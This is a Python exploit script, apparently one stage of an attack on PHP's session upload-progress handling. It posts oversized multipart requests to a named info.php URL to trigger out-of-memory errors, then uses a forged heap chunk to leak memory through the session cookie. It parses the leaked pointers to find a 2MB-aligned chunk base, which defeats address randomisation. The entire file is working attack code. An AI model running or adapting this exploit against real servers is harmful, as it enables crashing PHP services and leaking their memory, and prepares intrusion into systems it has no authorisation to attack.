import sys, time, struct
sys.path.insert(0, r"C:\Users\likat\p2s52704")
from exploit import Target, build_multipart, parse_cookie, chunk_base_from_cookie

URL = "https://attackit.co.il/files/php/info.php"
t = Target(URL, timeout=120, verbose=False)
SID = b"attacksessionid0001"
HUGE_MB = int(sys.argv[1]) if len(sys.argv) > 1 else 64

def filepart(): return {"name": "f", "filename": "a.txt", "data": b"A" * 64}
def big(): return {"name": "big", "data": b"B" * (HUGE_MB * 1024 * 1024)}

# rotate
parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * 3000} for i in range(1001)]
parts += [{"name": "PHPSESSID", "data": b"\x00"},
          {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}, filepart(), big()]
print(f"[*] rotate: {HUGE_MB}MB big field + 1001 fields", flush=True)
try:
    r0 = t.post(build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=120)
    print(f"    rotate: len={len(r0)}", flush=True)
except Exception as e:
    print("rotate EXC:", e); sys.exit(1)
time.sleep(0.3)

# stage 1 reqA (OOM trigger)
parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
parts += [{"name": "PHPSESSID", "data": b"\x00"},
          {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}, filepart(), big()]
print(f"[*] reqA: OOM trigger ({HUGE_MB}MB)", flush=True)
try:
    rA = t.post(build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=120)
    oom = b"Allowed memory size" in rA
    print(f"    reqA: len={len(rA)} OOM={oom}", flush=True)
    if oom:
        idx = rA.find(b"Allowed memory size")
        print("    OOM msg:", rA[idx:idx+100].decode("utf-8","replace"), flush=True)
except Exception as e:
    print("reqA EXC:", e); sys.exit(1)
time.sleep(0.2)

# stage 1 reqB (leak)
parts = [{"name": "PHPSESSID", "data": SID}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
for i in range(841):
    parts.append({"name": str(1000 + i), "data": (f"v{i:04d}" + "x" * 44)[:48].encode()})
forge = bytearray(b"A" * 79); struct.pack_into("<Q", forge, 0x10, 0x1000); forge[0x18] = ord("L")
parts.append({"name": "1999", "data": bytes(forge)})
print("[*] reqB: leak read", flush=True)
try:
    resp = t.post(build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20)
except Exception as e:
    print("reqB EXC:", e); sys.exit(1)
raw = parse_cookie(resp)
print(f"    reqB: len={len(resp)} cookie_len={len(raw) if raw else 0}", flush=True)
if raw and len(raw) >= 1000:
    cb = chunk_base_from_cookie(raw)
    print("    chunk base:", hex(cb) if cb else "None (no 2MB-aligned cluster)", flush=True)
    # show raw pointer stats
    from collections import Counter
    c = Counter()
    ptrs = []
    for i in range(0, len(raw) - 8, 8):
        v = int.from_bytes(raw[i:i+8], "little")
        if 0x700000000000 <= v < 0x800000000000:
            ptrs.append(v)
            c[v & ~0x1FFFFF] += 1
    print(f"    ptrs in 0x70..-0x80..: {len(ptrs)}", flush=True)
    for base, cnt in c.most_common(5):
        print(f"      2MB-aligned {hex(base)}: {cnt} hits", flush=True)
else:
    print("    cookie too short for chunk base extraction", flush=True)
    if raw:
        print("    cookie hex:", raw[:60].hex(), flush=True)
    print("    resp head:", resp[:300].decode("utf-8","replace"), flush=True)
